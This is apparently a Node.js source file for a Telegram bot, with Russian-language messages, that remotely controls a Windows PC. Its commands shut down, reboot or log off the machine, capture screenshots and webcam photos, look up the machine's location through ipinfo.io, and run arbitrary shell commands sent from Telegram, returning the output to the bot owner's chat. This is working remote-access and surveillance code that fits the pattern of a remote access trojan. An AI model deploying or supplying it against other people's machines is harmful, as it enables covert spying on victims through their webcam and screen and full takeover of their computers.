const { exec } = require('child_process');
const { readFileSync, writeFileSync, createWriteStream } = require('fs');
const takephoto = require('desktop-screenshot');
const { capture } = require('node-webcam');
const { access, rm } = require('fs').promises;

//[---] getloc module
const https = require('https');

let getloc = async () => {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'ipinfo.io',
            path: '/json',
            method: 'GET'
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });

            res.on('end', () => {
                try {
                    const jsonData = JSON.parse(data);
                    const coordinates = jsonData.loc.split(',');
                    resolve([coordinates[0], coordinates[1]]);
                } catch (error) {
                    reject(error);
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        req.end();
    });
};
//[---] ---

let read = (file, type) => readFileSync(file, type ?? 'utf8')
let write = (file, data) => writeFileSync(file, data)

let DATA = {}

let loaddata = () => {
    DATA = {
        token: read('token'),
        chatid: read('data').split(' ')[0] ?? false,
        userid: read('data').split(' ')[1] ?? false,
        timeouts: {
            beforestop: 500,
            cantstoptime: 3000
        }
    }
    DATA.token.startsWith('"') ? DATA.token = DATA.token.slice(1, -1) : void 0
}

loaddata()

const bot = new (require('node-telegram-bot-api'))(DATA.token, { 'polling': true })

let sendmsg = text => bot.sendMessage(DATA.chatid, text, { allow_sending_without_reply: true })
let sendphoto = buffer => bot.sendPhoto(DATA.chatid, buffer, { allow_sending_without_reply: true })
let sendgeo = (a, b) => bot.sendLocation(DATA.chatid, a, b, { allow_sending_without_reply: true })

let takecamera = () => capture('./screenshots/camera.jpg', {quality: 100, output: 'jpg', device: false, callbackReturn: 'buffer'})

//Имеющиеся команды
let commands = {
    'help': {
        d: 'Помощь по командам',
        f: (() => {
            let d = '-- Список команд бота --'
            for (const e in commands) {
                d += `\n/${e} - ${commands[e].d}`
            }
            sendmsg(d)
        })
    },
    'shutdown': {
        d: 'Выключение пк',
        f: (() => {
            sendmsg('Выключаем..')
            exec('shutdown /s /f /t 0')
        })
    },
    'reload': {
        d: 'Перезагрузка пк',
        f: (() => {
            sendmsg('Просто перезагружаем..')
            exec('shutdown /r /f /t 0')
        })
    },
    'hardreload': {
        d: 'Полная перезагрузка пк',
        f: (() => {
            sendmsg('Полностью перезагружаем..')
            exec('shutdown /r /f /t 0 /hybrid off')
        })
    },
    'logoff': {
        d: 'Выйти из пользователя',
        f: (() => {
            sendmsg('Выходим..')
            exec('shutdown /l')
        })
    },
    'takescreen': {
        d: 'Получить скриншот экрана',
        f: (async () => {
            sendmsg('Запрашиваем новый скриншот..')
            await rm('./screenshots/screen.jpg').catch(() => {})
            takephoto('./screenshots/screen.png')
            setTimeout(() => {
                let s = createWriteStream('./screenshots/screen.jpg', { 'autoClose': true, 'encoding': 'base64' })
                s.write(read('./screenshots/screen.png', 'base64'))
                s.close()
            }, 2000)
            let tryes = 0
            let trying = (async () => {
                if (tryes > 100000) {
                    return sendmsg('Превышено время ожидания, отмена отправки..')
                }
                tryes++
                await access('./screenshots/screen.jpg').then(() => {
                    sendmsg('Скриншот готов, отправляем..')
                    sendphoto('./screenshots/screen.jpg')
                }).catch((e) => { trying() })
            })
            trying()
        })
    },
    'takecamera': {
        d: 'Получить фото с камеры',
        f: (async () => {
            sendmsg('Запрашиваем новое фото..')
            await rm('./screenshots/camera.jpg').catch(() => {})
            takecamera()
            let tryes = 0
            let trying = (async () => {
                if (tryes > 100000) {
                    return sendmsg('Превышено время ожидания, отмена отправки..')
                }
                tryes++
                await access('./screenshots/camera.jpg').then(() => {
                    sendmsg('Фото готово, отправляем..')
                    sendphoto('./screenshots/camera.jpg')
                }).catch((e) => { trying() })
            })
            trying()
        })
    },
    'takegeo': {
        d: 'Получить инфо по геолокации с запроса на ipinfo.io',
        f: (() => {
            sendmsg('Получение информации о геопозиции с сайта..')
            getloc().then(a => {
                sendmsg(`Предварительное инфо: [Долгота: ${a[0]}] [Широта: ${a[1]}]`)
                sendgeo(a[0], a[1])
            }).catch(() => {
                sendmsg('Не получилось найти информацию')
            })
        })
    },
    'run': {
        d: 'Запуск команды в командной строке бота',
        f: (a => {
            sendmsg('Запускаем команду и ожидаем ответа..')
            exec(a.text.substring(a.text.split(' ')[0].length + 1), (e, s) => {
                if (e) return sendmsg(`Команда вернула ошибку: ${e}`)
                sendmsg(Buffer.from(s.trim()).toString('utf8'))
            })
        })
    },
    'ping': {
        d: 'Откликнуться боту',
        f: (() => sendmsg('Понг! Я на месте!'))
    },
    'stop': {
        d: 'Остановка бота',
        f: (() => {
            sendmsg('Уже бегу останавливать!')
            initstop()
        })
    }
}

let initstop = () => {
    if (!prestop < Date.now()) return
    sendmsg('Отключаем бота..')
    setTimeout(() => {
        bot.close()
        process.exit(1)
    }, Number(DATA.timeouts.beforestop))
}

let prestop = Date.now() + 4000

bot.on('message', async (msg, met) => {
    if (!DATA.userid && msg.text == '/start') {
        write('data', `${msg.chat.id} ${msg.from.id}`)
        loaddata()
        sendmsg('Первое включение! Авто настройка завершена, пользуйтесь!')
        return
    } else if (met.type == 'text' && msg.from.id == DATA.userid || [' ', '', undefined, '\r'].includes(DATA.userid)) {
        if (msg.text.startsWith('/')) {
            let cmd = msg.text.substring(1).trim().split(' ')[0]
            cmd in commands ? await commands[cmd].f(msg) : sendmsg('Вы что то хотели? Если да, можно ввести /help')
        }
    }
})